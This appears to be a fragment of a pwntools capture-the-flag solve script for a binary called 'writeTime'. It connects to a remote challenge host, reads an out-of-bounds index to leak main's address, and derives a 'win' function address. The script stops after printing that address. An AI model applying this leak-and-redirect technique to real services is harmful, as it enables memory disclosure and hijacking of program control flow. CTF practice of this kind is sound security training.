from pwn import *

exe = context.binary = ELF('writeTime')

io = remote('eth007.me', 42055)
# get a leak of some address, subtract offset to find win address
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'idx: ')
io.sendline(b'21')
mainaddr = int(io.recvline().strip(), 16)
winaddr = mainaddr - 32
print("winaddr: " + hex(winaddr))